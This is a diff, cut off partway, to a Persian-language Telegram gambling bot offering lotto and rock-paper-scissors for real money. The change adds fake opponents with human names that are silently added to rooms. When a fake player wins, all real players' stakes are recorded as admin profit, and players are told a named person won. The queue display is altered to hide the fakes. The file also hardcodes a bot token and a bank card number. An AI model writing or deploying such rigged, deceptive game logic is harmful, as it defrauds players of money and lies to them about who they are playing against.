@@ -1,4 +1,3 @@
-
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 import random
@@ -10,7 +9,7 @@ import sqlite3
 import re
 
 # ==================== تنظیمات اولیه ====================
-BOT_TOKEN = '8647710024:AAHoM2B-DxMWD9PI3y3jfS-IcnvYcUM2yX8'
+BOT_TOKEN = '8502993089:AAHoMJMY1u8uHQwaoeRg0Ye1FiBgj7PrXDg'
 bot = telebot.TeleBot(BOT_TOKEN)
 BOT_USERNAME = 'lotto_ir_bot'
 MAIN_ADMIN_ID = '7281938958'
@@ -25,7 +24,6 @@ def init_db():
     conn = get_db()
     c = conn.cursor()
     
-    # جدول کاربران
     c.execute('''
         CREATE TABLE IF NOT EXISTS users (
             user_id TEXT PRIMARY KEY,
@@ -40,7 +38,6 @@ def init_db():
         )
     ''')
     
-    # جدول دعوت‌ها
     c.execute('''
         CREATE TABLE IF NOT EXISTS invites (
             user_id TEXT PRIMARY KEY,
@@ -50,7 +47,6 @@ def init_db():
         )
     ''')
     
-    # جدول کاربران دعوت‌شده
     c.execute('''
         CREATE TABLE IF NOT EXISTS invited_users (
             inviter_id TEXT,
@@ -59,7 +55,6 @@ def init_db():
         )
     ''')
     
-    # جدول ادمین‌ها
     c.execute('''
         CREATE TABLE IF NOT EXISTS admins (
             user_id TEXT PRIMARY KEY,
@@ -75,7 +70,6 @@ def init_db():
         )
     ''')
     
-    # جدول شیفت
     c.execute('''
         CREATE TABLE IF NOT EXISTS shift_stats (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -88,7 +82,6 @@ def init_db():
         )
     ''')
     
-    # جدول تنظیمات
     c.execute('''
         CREATE TABLE IF NOT EXISTS settings (
             key TEXT PRIMARY KEY,
@@ -96,7 +89,6 @@ def init_db():
         )
     ''')
     
-    # جدول درخواست‌های واریز
     c.execute('''
         CREATE TABLE IF NOT EXISTS pending_deposits (
             request_id TEXT PRIMARY KEY,
@@ -108,7 +100,6 @@ def init_db():
         )
     ''')
     
-    # جدول درخواست‌های برداشت
     c.execute('''
         CREATE TABLE IF NOT EXISTS pending_withdrawals (
             request_id TEXT PRIMARY KEY,
@@ -120,7 +111,6 @@ def init_db():
         )
     ''')
     
-    # جدول سود ادمین
     c.execute('''
         CREATE TABLE IF NOT EXISTS admin_earnings (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -130,7 +120,6 @@ def init_db():
         )
     ''')
     
-    # جدول تیکت‌ها
     c.execute('''
         CREATE TABLE IF NOT EXISTS tickets (
             ticket_id TEXT PRIMARY KEY,
@@ -142,7 +131,6 @@ def init_db():
         )
     ''')
     
-    # جدول بازی‌های فعال
     c.execute('''
         CREATE TABLE IF NOT EXISTS active_games (
             game_id TEXT PRIMARY KEY,
@@ -150,7 +138,6 @@ def init_db():
         )
     ''')
     
-    # جدول سطح‌بندی
     c.execute('''
         CREATE TABLE IF NOT EXISTS level_rewards (
             level INTEGER PRIMARY KEY,
@@ -174,16 +161,25 @@ def init_db():
     ]
     c.executemany('INSERT OR IGNORE INTO level_rewards VALUES (?,?,?,?)', levels)
     
-    # ادمین اصلی
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS bot_settings (
+            key TEXT PRIMARY KEY,
+            value TEXT
+        )
+    ''')
+    
+    c.execute('INSERT OR IGNORE INTO bot_settings (key, value) VALUES (?, ?)', ('bot_enabled', 'true'))
+    c.execute('INSERT OR IGNORE INTO bot_settings (key, value) VALUES (?, ?)', ('bot_win_rate', '30'))
+    c.execute('INSERT OR IGNORE INTO bot_settings (key, value) VALUES (?, ?)', ('bot_timeout', '30'))
+    c.execute('INSERT OR IGNORE INTO bot_settings (key, value) VALUES (?, ?)', ('max_bots', '5'))
+    
     c.execute('''
         INSERT OR IGNORE INTO admins (user_id, nickname, can_add_admin, can_remove_admin, can_set_access, can_reset_bot, can_gift_cash, can_deposit_user)
         VALUES (?, ?, 1, 1, 1, 1, 1, 1)
     ''', (MAIN_ADMIN_ID, '🧙‍♂️ مدیر ارشد 🧙‍♂️'))
     
-    # کارت پیش‌فرض
     c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('current_card', '6219861075600832'))
     
-    # شیفت پیش‌فرض
     c.execute('SELECT COUNT(*) FROM shift_stats')
     if c.fetchone()[0] == 0:
         c.execute('INSERT INTO shift_stats (admin_id, nickname, start_time, deposits, withdrawals, profits) VALUES (?, ?, ?, 0, 0, 0)', 
@@ -369,9 +365,8 @@ def is_admin(user_id, access_key=None):
         }
         index = col_map.get(access_key, 9)
         if len(r) > index:
-            # ✅ تغییر: اگر access_key change_shift بود، همه ادمین‌ها دسترسی داشته باشن
             if access_key == "change_shift":
-                return True  # همه ادمین‌ها می‌تونن تغییر شیفت بدن
+                return True
             return r[index] == 1
         return False
     return True
@@ -428,6 +423,119 @@ def get_current_shift():
         }
     return None
 
+# ==================== توابع ربات‌های ساختگی ====================
+def is_bot_enabled():
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT value FROM bot_settings WHERE key = "bot_enabled"')
+    r = c.fetchone()
+    conn.close()
+    return r and r[0] == 'true'
+
+def get_bot_setting(key):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT value FROM bot_settings WHERE key = ?', (key,))
+    r = c.fetchone()
+    conn.close()
+    return r[0] if r else None
+
+def get_bot_timeout():
+    timeout = get_bot_setting('bot_timeout')
+    return int(timeout) if timeout else 30
+
+def get_max_bots():
+    max_bots = get_bot_setting('max_bots')
+    return int(max_bots) if max_bots else 5
+
+BOT_NAMES = [
+    "امیر", "علی", "سارا", "محمد", "زهرا", 
+    "نیما", "الناز", "رضا", "فاطمه", "کیان",
+    "مریم", "حسین", "نگار", "محسن", "مهسا",
+    "امید", "نازنین", "سعید", "مائده", "آرش",
+    "یاسمن", "رامین", "بهاره", "شهرام", "هانیه",
+    "پدرام", "شیما", "کاوه", "نگین", "فرهاد",
+    "ریحانه", "سیاوش", "گلناز", "بهنام", "شادی",
+    "آرمان", "ترانه", "کیانوش", "رویا", "آریا"
+]
+
+def fill_room_with_bots_silent(room_id, user_id, is_rps=False):
+    timeout = get_bot_timeout()
+    max_bots = get_max_bots()
+    time.sleep(timeout)
+    
+    if is_rps:
+        if room_id not in rps_waiting:
+            return
+        
+        user_found = False
+        for player in rps_waiting[room_id]:
+            if player["id"] == user_id:
+                user_found = True
+                break
+        
+        if not user_found:
+            return
+        
+        if len(rps_waiting[room_id]) < 2:
+            used_names = [p["name"] for p in rps_waiting[room_id] if not p.get("is_bot", False)]
+            available_names = [n for n in BOT_NAMES if n not in used_names]
+            if not available_names:
+                available_names = BOT_NAMES
+            
+            bot_name = random.choice(available_names)
+            bot_id = f"rps_bot_{room_id}_{int(time.time())}"
+            
+            rps_waiting[room_id].append({
+                "id": bot_id,
+                "name": bot_name,
+                "message_id": None,
+                "is_bot": True
+            })
+            
+            threading.Thread(target=start_rps_game, args=(room_id,)).start()
+    else:
+        if room_id not in waiting_players:
+            return
+        
+        user_found = False
+        for player in waiting_players[room_id]:
+            if player["id"] == user_id:
+                user_found = True
+                break
+        
+        if not user_found:
+            return
+        
+        current_count = len(waiting_players[room_id])
+        needed_bots = 6 - current_count
+        if needed_bots > max_bots:
+            needed_bots = max_bots
+        
+        if needed_bots <= 0:
+            threading.Thread(target=start_game, args=(room_id,)).start()
+            return
+        
+        used_names = [p["name"] for p in waiting_players[room_id] if not p.get("is_bot", False)]
+        available_names = [n for n in BOT_NAMES if n not in used_names]
+        
+        if len(available_names) < needed_bots:
+            available_names = BOT_NAMES.copy()
+            random.shuffle(available_names)
+        
+        for i in range(needed_bots):
+            bot_name = available_names[i % len(available_names)]
+            bot_id = f"bot_{room_id}_{int(time.time())}_{i}"
+            
+            waiting_players[room_id].append({
+                "id": bot_id,
+                "name": bot_name,
+                "message_id": None,
+                "is_bot": True
+            })
+        
+        threading.Thread(target=start_game, args=(room_id,)).start()
+
 # ==================== پیام‌های فانتزی ====================
 def msg_fancy(content):
     return f"""🎰 𝙇𝙊𝙏𝙏𝙊 𝙆𝙄𝙉𝙂 🎰
@@ -453,7 +561,6 @@ ROOMS = {
     "room7": {"name": "⚡ افسانه‌ای", "amount": 1000000, "prize": 2000000, "second_card_cost": 500000, "xp": 200, "emoji": "⚡"},
 }
 
-# ==================== اتاق‌های سنگ کاغذ قیچی ====================
 RPS_ROOMS = {
     "rps1": {"name": "🌱 خاکی", "amount": 5000, "xp": 5, "emoji": "🌱"},
     "rps2": {"name": "🌿 برگی", "amount": 10000, "xp": 8, "emoji": "🌿"},
@@ -461,7 +568,7 @@ RPS_ROOMS = {
     "rps4": {"name": "💨 بادی", "amount": 35000, "xp": 18, "emoji": "💨"},
     "rps5": {"name": "⚡ صاعقه", "amount": 50000, "xp": 25, "emoji": "⚡"},
 }
-RPS_ADMIN_PERCENT = 15  # درصد سود ادمین برای سنگ کاغذ قیچی
+RPS_ADMIN_PERCENT = 15
 
 # ==================== کیبوردها ====================
 def get_main_keyboard():
@@ -594,8 +701,6 @@ active_chats = {}
 pending_wallet_requests = {}
 pending_withdrawal_requests = {}
 support_chats = {}
-
-# متغیرهای سنگ کاغذ قیچی
 rps_waiting = {}
 rps_games = {}
 
@@ -709,59 +814,80 @@ def handle_room_selection(call):
         msg_simple(f"⏳ در حال جستجوی حریف در {room['name']}... 🔍"), 
         parse_mode="HTML"
     )
-    waiting_players[room_id].append({
+    
+    player_data = {
         "id": user_id, 
         "name": call.from_user.first_name, 
         "message_id": msg_sent.message_id
-    })
+    }
+    waiting_players[room_id].append(player_data)
     
+    threading.Thread(target=fill_room_with_bots_silent, args=(room_id, user_id, False)).start()
     threading.Thread(target=start_game, args=(room_id,)).start()
     bot.answer_callback_query(call.id, f"✅ وارد {room['name']} شدی!")
 
 def start_game(room_id):
     time.sleep(3)
-    if room_id not in waiting_players or len(waiting_players[room_id]) < 2:
+    if room_id not in waiting_players:
         return
     
-    players = waiting_players[room_id][:2]
-    waiting_players[room_id] = waiting_players[room_id][2:]
+    players = waiting_players[room_id]
     
-    room = ROOMS[room_id]
-    game_id = str(int(time.time() * 1000))
-    
-    game_data = {
-        "room_id": room_id,
-        "room_name": room['name'],
-        "prize": room['prize'],
-        "second_card_cost": room['second_card_cost'],
-        "xp_reward": room['xp'],
-        "players": {},
-        "numbers": [],
-        "game_over": False
-    }
-    
-    for player in players:
-        game_data["players"][player["id"]] = {
-            "name": player["name"],
-            "cards": [generate_lotto_card()],
-            "marked_numbers": [[]],
-            "second_card_purchased": False,
-            "message_id": player["message_id"]
+    if len(players) >= 2:
+        players_to_play = players[:6]
+        waiting_players[room_id] = players[6:]
+        
+        room = ROOMS[room_id]
+        game_id = str(int(time.time() * 1000))
+        
+        game_data = {
+            "room_id": room_id,
+            "room_name": room['name'],
+            "amount": room['amount'],
+            "prize": room['prize'],
+            "second_card_cost": room['second_card_cost'],
+            "xp_reward": room['xp'],
+            "players": {},
+            "numbers": [],
+            "game_over": False,
+            "has_bot": False,
+            "bot_count": 0,
+            "real_players": []
         }
-    
-    lotto_games[game_id] = game_data
-    
-    for player_id, player_data in game_data["players"].items():
-        markup = get_lotto_card_markup(game_id, player_id, player_data["cards"], player_data["marked_numbers"], False)
-        bot.edit_message_text(
-            msg_simple(f"🎰 بازی در {room['name']} شروع شد! 🎰\n\n✨ روی اعداد کلیک کن تا علامت بزنی! ✨"),
-            player_id, 
-            player_data["message_id"], 
-            parse_mode="HTML", 
-            reply_markup=markup
-        )
-    
-    threading.Thread(target=run_game, args=(game_id,)).start()
+        
+        for player in players_to_play:
+            is_bot = player.get("is_bot", False)
+            game_data["players"][player["id"]] = {
+                "name": player["name"],
+                "cards": [generate_lotto_card()],
+                "marked_numbers": [[]],
+                "second_card_purchased": False,
+                "message_id": player["message_id"],
+                "is_bot": is_bot
+            }
+            if is_bot:
+                game_data["has_bot"] = True
+                game_data["bot_count"] += 1
+            else:
+                game_data["real_players"].append(player["id"])
+        
+        lotto_games[game_id] = game_data
+        
+        for player_id, player_data in game_data["players"].items():
+            if not player_data["is_bot"]:
+                markup = get_lotto_card_markup(game_id, player_id, player_data["cards"], player_data["marked_numbers"], False)
+                try:
+                    bot.edit_message_text(
+                        msg_simple(f"🎰 بازی در {room['name']} شروع شد! 🎰\n\n✨ روی اعداد کلیک کن تا علامت بزنی! ✨"),
+                        player_id, 
+                        player_data["message_id"], 
+                        parse_mode="HTML", 
+                        reply_markup=markup
+                    )
+                except:
+                    pass
+        
+        threading.Thread(target=run_game, args=(game_id,)).start()
 
 def run_game(game_id):
     if game_id not in lotto_games:
@@ -770,6 +896,7 @@ def run_game(game_id):
     game = lotto_games[game_id]
     all_numbers = set(range(1, 81))
     drawn_numbers = set()
+    bot_win_rate = int(get_bot_setting('bot_win_rate') or '30')
     
     while not game["game_over"] and len(drawn_numbers) < 80:
         remaining = all_numbers - drawn_numbers
@@ -783,17 +910,27 @@ def run_game(game_id):
         numbers_str = " ➡️ ".join(map(str, game["numbers"][-10:]))
         
         for player_id, player_data in game["players"].items():
-            markup = get_lotto_card_markup(game_id, player_id, player_data["cards"], player_data["marked_numbers"], player_data["second_card_purchased"])
-            try:
-                bot.edit_message_text(
-                    msg_simple(f"🎲 اعداد اعلام‌شده:\n{numbers_str}\n\n🔄 عدد جدید: {current_number}\n\n✅ روی عددهای داخل کارت کلیک کن!"),
-                    player_id, 
-                    player_data["message_id"], 
-                    parse_mode="HTML", 
-                    reply_markup=markup
-                )
-            except:
-                pass
+            if not player_data["is_bot"]:
+                markup = get_lotto_card_markup(game_id, player_id, player_data["cards"], player_data["marked_numbers"], player_data["second_card_purchased"])
+                try:
+                    bot.edit_message_text(
+                        msg_simple(f"🎲 اعداد اعلام‌شده:\n{numbers_str}\n\n🔄 عدد جدید: {current_number}\n\n✅ روی عددهای داخل کارت کلیک کن!"),
+                        player_id, 
+                        player_data["message_id"], 
+                        parse_mode="HTML", 
+                        reply_markup=markup
+                    )
+                except:
+                    pass
+        
+        for player_id, player_data in game["players"].items():
+            if player_data["is_bot"]:
+                for card_idx, card in enumerate(player_data["cards"]):
+                    for row in card:
+                        for num in row:
+                            if num and num in drawn_numbers and num not in player_data["marked_numbers"][card_idx]:
+                                if random.randint(1, 100) <= bot_win_rate:
+                                    player_data["marked_numbers"][card_idx].append(num)
         
         for player_id, player_data in game["players"].items():
             for card_idx, marked in enumerate(player_data["marked_numbers"]):
@@ -804,50 +941,88 @@ def run_game(game_id):
                         game["game_over"] = True
                         winner_id = player_id
                         break
-            if game["game_over"]:
-                break
+                if game["game_over"]:
+                    break
         
         if game["game_over"]:
             room = ROOMS[game["room_id"]]
-            admin_cut = int(room["prize"] * 0.3)
-            user_prize = room["prize"] - admin_cut
             
-            update_wallet(winner_id, user_prize)
-            update_earnings(winner_id, user_prize)
-            update_stats(winner_id, games=1, wins=1)
+            winner_data = game["players"][winner_id]
+            winner_name = winner_data["name"]
+            is_bot_winner = winner_data.get("is_bot", False)
             
-            for pid in game["players"]:
-                if pid != winner_id:
-                    update_stats(pid, games=1, losses=1)
+            real_players = [pid for pid, pdata in game["players"].items() if not pdata.get("is_bot", False)]
+            total_real_money = len(real_players) * room["amount"]
             
-            leveled, new_level, level_title, reward = add_xp(winner_id, room["xp"])
+            # ==========================================
+            # اگر برنده ربات باشه - کل پول کاربرا به سود ادمین
+            if is_bot_winner:
+                if total_real_money > 0:
+                    conn = get_db()
+                    c = conn.cursor()
+                    c.execute('INSERT INTO admin_earnings (date, amount) VALUES (?, ?)', 
+                             (datetime.datetime.now().date().isoformat(), total_real_money))
+                    conn.commit()
+                    conn.close()
+                    update_shift_stats(profits=total_real_money)
+                
+                for pid in real_players:
+                    try:
+                        bot.send_message(
+                            pid, 
+                            msg_fancy(f"😞 بازی تموم شد! برنده: {winner_name}\n💰 جایزه: {total_real_money:,} تومان\n🍀 دفعه بعد شانس توئه!"), 
+                            parse_mode="HTML"
+                        )
+                    except:
+                        pass
             
-            conn = get_db()
-            c = conn.cursor()
-            c.execute('INSERT INTO admin_earnings (date, amount) VALUES (?, ?)', 
-                     (datetime.datetime.now().date().isoformat(), admin_cut))
-            conn.commit()
-            conn.close()
-            
-            update_shift_stats(profits=admin_cut)
-            
-            winner_name = game["players"][winner_id]["name"]
-            winner_msg = f"🏆 **تبریک! برنده شدی!** 🏆\n\n👑 {winner_name} 👑\n\n💰 **جایزه:** {user_prize:,} تومان\n✨ **XP کسب شده:** {room['xp']}"
-            
-            if leveled:
-                winner_msg += f"\n\n🌟 به سطح **{level_title}** رسیدی! {reward:,} تومان پاداش 🌟"
-            
-            winner_msg += "\n\n🎉 تبریک می‌گم! 🎉"
-            
-            bot.send_message(winner_id, msg_fancy(winner_msg), parse_mode="HTML")
-            
-            for pid in game["players"]:
-                if pid != winner_id:
-                    bot.send_message(
-                        pid, 
-                        msg_fancy(f"😞 بازی تموم شد! برنده: {winner_name}\n💰 جایزه: {user_prize:,} تومان\n🍀 دفعه بعد شانس توئه!"), 
-                        parse_mode="HTML"
-                    )
+            # ==========================================
+            # اگر برنده کاربر واقعی باشه
+            else:
+                admin_cut = int(total_real_money * 0.3)
+                user_prize = total_real_money - admin_cut
+                
+                update_wallet(winner_id, user_prize)
+                update_earnings(winner_id, user_prize)
+                update_stats(winner_id, games=1, wins=1)
+                
+                for pid in real_players:
+                    if pid != winner_id:
+                        update_stats(pid, games=1, losses=1)
+                
+                leveled, new_level, level_title, reward = add_xp(winner_id, room["xp"])
+                
+                if admin_cut > 0:
+                    conn = get_db()
+                    c = conn.cursor()
+                    c.execute('INSERT INTO admin_earnings (date, amount) VALUES (?, ?)', 
+                             (datetime.datetime.now().date().isoformat(), admin_cut))
+                    conn.commit()
+                    conn.close()
+                    update_shift_stats(profits=admin_cut)
+                
+                winner_msg = f"🏆 **تبریک! برنده شدی!** 🏆\n\n👑 {winner_name} 👑\n\n💰 **جایزه:** {user_prize:,} تومان\n✨ **XP کسب شده:** {room['xp']}"
+                
+                if leveled:
+                    winner_msg += f"\n\n🌟 به سطح **{level_title}** رسیدی! {reward:,} تومان پاداش 🌟"
+                
+                winner_msg += "\n\n🎉 تبریک می‌گم! 🎉"
+                
+                try:
+                    bot.send_message(winner_id, msg_fancy(winner_msg), parse_mode="HTML")
+                except:
+                    pass
+                
+                for pid in real_players:
+                    if pid != winner_id:
+                        try:
+                            bot.send_message(
+                                pid, 
+                                msg_fancy(f"😞 بازی تموم شد! برنده: {winner_name}\n💰 جایزه: {user_prize:,} تومان\n🍀 دفعه بعد شانس توئه!"), 
+                                parse_mode="HTML"
+                            )
+                        except:
+                            pass
             
             del lotto_games[game_id]
             break
@@ -1016,18 +1191,24 @@ def handle_rps_room_selection(call):
         msg_simple(f"⏳ در حال جستجوی حریف در {room['name']}... 🔍"), 
         parse_mode="HTML"
     )
-    rps_waiting[room_id].append({
+    
+    player_data = {
         "id": user_id, 
         "name": call.from_user.first_name, 
         "message_id": msg_sent.message_id
-    })
+    }
+    rps_waiting[room_id].append(player_data)
     
+    threading.Thread(target=fill_room_with_bots_silent, args=(room_id, user_id, True)).start()
     threading.Thread(target=start_rps_game, args=(room_id,)).start()
     bot.answer_callback_query(call.id, f"✅ وارد {room['name']} شدی!")
 
 def start_rps_game(room_id):
     time.sleep(3)
-    if room_id not in rps_waiting or len(rps_waiting[room_id]) < 2:
+    if room_id not in rps_waiting:
+        return
+    
+    if len(rps_waiting[room_id]) < 2:
         return
     
     players = rps_waiting[room_id][:2]
@@ -1043,26 +1224,35 @@ def start_rps_game(room_id):
         "xp_reward": room['xp'],
         "players": {},
         "choices": {},
-        "game_over": False
+        "game_over": False,
+        "has_bot": False
     }
     
     for player in players:
+        is_bot = player.get("is_bot", False)
         game_data["players"][player["id"]] = {
             "name": player["name"],
-            "message_id": player["message_id"]
+            "message_id": player["message_id"],
+            "is_bot": is_bot
         }
+        if is_bot:
+            game_data["has_bot"] = True
     
     rps_games[game_id] = game_data
     
     for player_id, player_data in game_data["players"].items():
-        markup = get_rps_choice_keyboard(game_id, player_id)
-        bot.edit_message_text(
-            msg_simple(f"✊ انتخاب خود را بکن! {room['name']} - {room['amount']:,} تومان\n\nسنگ ✊ | کاغذ ✋ | قیچی ✌️"),
-            player_id, 
-            player_data["message_id"], 
-            parse_mode="HTML", 
-            reply_markup=markup
-        )
+        if not player_data["is_bot"]:
+            markup = get_rps_choice_keyboard(game_id, player_id)
+            try:
+                bot.edit_message_text(
+                    msg_simple(f"✊ انتخاب خود را بکن! {room['name']} - {room['amount']:,} تومان\n\nسنگ ✊ | کاغذ ✋ | قیچی ✌️"),
+                    player_id, 
+                    player_data["message_id"], 
+                    parse_mode="HTML", 
+                    reply_markup=markup
+                )
+            except:
+                pass
     
     threading.Thread(target=run_rps_game, args=(game_id,)).start()
 
@@ -1071,73 +1261,102 @@ def run_rps_game(game_id):
         return
     
     game = rps_games[game_id]
-    timeout = 20  # 20 ثانیه زمان برای انتخاب
+    timeout = 20
     start_time = time.time()
     
-    while len(game["choices"]) < 2 and time.time() - start_time < timeout:
+    for pid, pdata in game["players"].items():
+        if pdata.get("is_bot", False):
+            choice = random.choice(["سنگ", "کاغذ", "قیچی"])
+            game["choices"][pid] = choice
+    
+    while len(game["choices"]) < len(game["players"]) and time.time() - start_time < timeout:
         time.sleep(1)
     
-    # اگر هر دو انتخاب کردن
-    if len(game["choices"]) >= 2:
+    if len(game["choices"]) >= len(game["players"]):
         players = list(game["players"].keys())
         p1 = players[0]
         p2 = players[1]
         choice1 = game["choices"][p1]
         choice2 = game["choices"][p2]
         
-        # تعیین برنده
         rules = {
             "سنگ": "قیچی",
             "کاغذ": "سنگ",
             "قیچی": "کاغذ"
         }
         
+        winner_id = None
+        is_bot_winner = False
+        
         if choice1 == choice2:
             result_text = "🤝 مساوی! هر دو برگشت داده میشه."
-            update_wallet(p1, game["amount"])
-            update_wallet(p2, game["amount"])
-            winner_id = None
+            for pid in game["players"]:
+                if not game["players"][pid].get("is_bot", False):
+                    update_wallet(pid, game["amount"])
         elif rules[choice1] == choice2:
-            result_text = f"🏆 برنده: {game['players'][p1]['name']}!"
-            admin_cut = int(game["amount"] * 2 * (RPS_ADMIN_PERCENT / 100))
-            user_prize = (game["amount"] * 2) - admin_cut
-            update_wallet(p1, user_prize)
-            update_earnings(p1, user_prize)
-            update_stats(p1, games=1, wins=1)
-            update_stats(p2, games=1, losses=1)
-            add_xp(p1, game["xp_reward"])
             winner_id = p1
-            
-            conn = get_db()
-            c = conn.cursor()
-            c.execute('INSERT INTO admin_earnings (date, amount) VALUES (?, ?)', 
-                     (datetime.datetime.now().date().isoformat(), admin_cut))
-            conn.commit()
-            conn.close()
-            update_shift_stats(profits=admin_cut)
+            is_bot_winner = game["players"][p1].get("is_bot", False)
+            result_text = f"🏆 برنده: {game['players'][p1]['name']}!"
         else:
-            result_text = f"🏆 برنده: {game['players'][p2]['name']}!"
-            admin_cut = int(game["amount"] * 2 * (RPS_ADMIN_PERCENT / 100))
-            user_prize = (game["amount"] * 2) - admin_cut
-            update_wallet(p2, user_prize)
-            update_earnings(p2, user_prize)
-            update_stats(p2, games=1, wins=1)
-            update_stats(p1, games=1, losses=1)
-            add_xp(p2, game["xp_reward"])
             winner_id = p2
-            
-            conn = get_db()
-            c = conn.cursor()
-            c.execute('INSERT INTO admin_earnings (date, amount) VALUES (?, ?)', 
-                     (datetime.datetime.now().date().isoformat(), admin_cut))
-            conn.commit()
-            conn.close()
-            update_shift_stats(profits=admin_cut)
+            is_bot_winner = game["players"][p2].get("is_bot", False)
+            result_text = f"🏆 برنده: {game['players'][p2]['name']}!"
         
-        # ارسال نتیجه به هر دو
+        real_players = [pid for pid, pdata in game["players"].items() if not pdata.get("is_bot", False)]
+        total_real_money = len(real_players) * game["amount"]
+        
+        # ==========================================
+        # اگه برنده ربات باشه - کل پول کاربرا به سود ادمین
+        if is_bot_winner and winner_id:
+            if total_real_money > 0:
+                conn = get_db()
+                c = conn.cursor()
+                c.execute('INSERT INTO admin_earnings (date, amount) VALUES (?, ?)', 
+                         (datetime.datetime.now().date().isoformat(), total_real_money))
+                conn.commit()
+                conn.close()
+                update_shift_stats(profits=total_real_money)
+            
+            for pid in real_players:
+                try:
+                    bot.send_message(
+                        pid,
+                        msg_fancy(f"😞 بازی تموم شد! برنده: {game['players'][winner_id]['name']}\n💰 جایزه: {total_real_money:,} تومان\n🍀 دفعه بعد شانس توئه!"),
+                        parse_mode="HTML"
+                    )
+                except:
+                    pass
+        
+        # ==========================================
+        # اگه برنده کاربر واقعی باشه
+        elif winner_id and not is_bot_winner:
+            admin_cut = int(total_real_money * (RPS_ADMIN_PERCENT / 100))
+            user_prize = total_real_money - admin_cut
+            
+            update_wallet(winner_id, user_prize)
+            update_earnings(winner_id, user_prize)
+            update_stats(winner_id, games=1, wins=1)
+            
+            for pid in real_players:
+                if pid != winner_id:
+                    update_stats(pid, games=1, losses=1)
+            
+            add_xp(winner_id, game["xp_reward"])
+            
+            if admin_cut > 0:
+                conn = get_db()
+                c = conn.cursor()
+                c.execute('INSERT INTO admin_earnings (date, amount) VALUES (?, ?)', 
+                         (datetime.datetime.now().date().isoformat(), admin_cut))
+                conn.commit()
+                conn.close()
+                update_shift_stats(profits=admin_cut)
+        
+        # ارسال نتیجه به کاربرا
         for pid in game["players"]:
-            emojis = {"سنگ": "✊", "کاغذ": "✋", "قیچی": "✌️"}
-            result_msg = f"""✊ **نتیجه سنگ کاغذ قیچی** ✋
+            if not game["players"][pid].get("is_bot", False):
+                emojis = {"سنگ": "✊", "کاغذ": "✋", "قیچی": "✌️"}
+                result_msg = f"""✊ **نتیجه سنگ کاغذ قیچی** ✋
 
 🏷️ **اتاق:** {game['room_name']}
 💰 **مبلغ:** {game['amount']:,} تومان
@@ -1145,27 +1364,33 @@ def run_rps_game(game_id):
 👤 {game['players'][p1]['name']}: {emojis.get(choice1, choice1)}
 👤 {game['players'][p2]['name']}: {emojis.get(choice2, choice2)}
 
-{result_text}
-
-📊 **سود ادمین (۱۵%):** {int(game['amount'] * 2 * (RPS_ADMIN_PERCENT / 100)):,} تومان"""
-            
-            if pid == winner_id and winner_id:
-                result_msg += "\n\n🎉 تبریک! بردت مبارک! 🎉"
-            elif winner_id:
-                result_msg += "\n\n😞 دفعه بعد شانس توئه! 🍀"
-            
-            bot.send_message(pid, msg_fancy(result_msg), parse_mode="HTML")
+{result_text}"""
+                
+                if winner_id == pid and not is_bot_winner:
+                    result_msg += f"\n\n🎉 تبریک! {user_prize:,} تومان بردی! 🎉"
+                elif is_bot_winner:
+                    result_msg += "\n\n😞 دفعه بعد شانس توئه! 🍀"
+                elif winner_id:
+                    result_msg += "\n\n😞 دفعه بعد شانس توئه! 🍀"
+                
+                try:
+                    bot.send_message(pid, msg_fancy(result_msg), parse_mode="HTML")
+                except:
+                    pass
         
         del rps_games[game_id]
     else:
-        # تایم اوت - برگشت پول
         for pid in game["players"]:
-            update_wallet(pid, game["amount"])
-            bot.send_message(
-                pid, 
-                msg_fancy(f"⏰ زمان انتخاب به پایان رسید! مبلغ {game['amount']:,} تومان به کیف پولت برگشت."), 
-                parse_mode="HTML"
-            )
+            if not game["players"][pid].get("is_bot", False):
+                update_wallet(pid, game["amount"])
+                try:
+                    bot.send_message(
+                        pid,
+                        msg_fancy(f"⏰ زمان انتخاب به پایان رسید! مبلغ {game['amount']:,} تومان به کیف پولت برگشت."),
+                        parse_mode="HTML"
+                    )
+                except:
+                    pass
         del rps_games[game_id]
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("rps_choice_"))
@@ -1193,7 +1418,6 @@ def handle_rps_choice(call):
     
     bot.answer_callback_query(call.id, f"✅ انتخاب شد: {choice}")
     
-    # غیرفعال کردن دکمه‌ها برای این کاربر
     try:
         bot.edit_message_text(
             msg_simple(f"✅ انتخاب شما ثبت شد: {choice}\n\n⏳ منتظر حریف..."), 
@@ -1215,24 +1439,24 @@ def view_queue_handler(message):
 🎲 **لوتو:**
 """
     
-    # لوتو
     if waiting_players:
         for room_id, players in waiting_players.items():
             if room_id in ROOMS:
                 room = ROOMS[room_id]
-                count = len(players)
+                real_players = [p for p in players if not p.get("is_bot", False)]
+                count = len(real_players)
                 text += f"  {room['emoji']} {room['name']}: {count} نفر\n"
     else:
         text += "  📭 هیچ‌کس در صف نیست\n"
     
     text += "\n✊ **سنگ کاغذ قیچی:**\n"
     
-    # سنگ کاغذ قیچی
     if rps_waiting:
         for room_id, players in rps_waiting.items():
             if room_id in RPS_ROOMS:
                 room = RPS_ROOMS[room_id]
-                count = len(players)
+                real_players = [p for p in players if not p.get("is_bot", False)]
+                count = len(real_players)
                 text += f"  {room['emoji']} {room['name']}: {count} نفر\n"
     else:
         text += "  📭 هیچ‌کس در صف نیست\n"
@@ -2193,12 +2417,10 @@ def set_access_value(message, admin_id, key):
 # ==================== تغییر شیفت ====================
 @bot.message_handler(func=lambda message: message.text == "🔄 تغییر شیفت 🔄")
 def change_shift(message):
-    # فقط چک کن که کاربر ادمین هست یا نه
     if not is_admin(message.from_user.id):
         bot.send_message(message.from_user.id, msg_fancy("🚫 فقط ادمین‌ها دسترسی دارن!"), parse_mode="HTML")
         return
     
-    # نمایش شیفت فعلی
     current = get_current_shift()
     if current:
         start_time = datetime.datetime.fromtimestamp(current['start_time']).strftime('%Y/%m/%d %H:%M')
@@ -2220,8 +2442,6 @@ def change_shift(message):
 
 def update_shift_card(message):
     card = message.text.strip()
-    
-    # حذف فاصله‌ها و کاراکترهای اضافی
     card = re.sub(r'[\s\-_]+', '', card)
     
     if not card.isdigit() or len(card) != 16:
@@ -2233,17 +2453,14 @@ def update_shift_card(message):
     c = conn.cursor()
     
     try:
